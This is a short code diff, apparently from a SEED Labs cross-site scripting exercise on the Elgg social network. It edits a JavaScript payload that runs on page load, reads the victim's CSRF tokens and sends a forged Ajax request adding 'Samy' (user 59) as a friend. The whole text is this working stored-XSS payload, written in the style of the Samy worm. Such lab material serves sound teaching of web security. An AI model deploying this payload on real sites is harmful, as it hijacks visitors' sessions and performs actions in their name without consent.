@@ -114,9 +114,8 @@ window.onload = function () {
     var Ajax=null;
     var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // (1)
     var token="&__elgg_token="+elgg.security.token.__elgg_token; // (2)
-    var guid="add?friend="+elgg.page_owner.guid;
     //Construct the HTTP request to add Samy as a friend.
-    var sendurl="http://www.seed-server.com/action/friends/"+ guid + ts + token + ts + token;
+    var sendurl="/action/friends/add?friend=59"+ts+token+ts+token; //FILL IN
     //Create and send Ajax request to add friend
     Ajax=new XMLHttpRequest();
     Ajax.open("GET", sendurl, true);
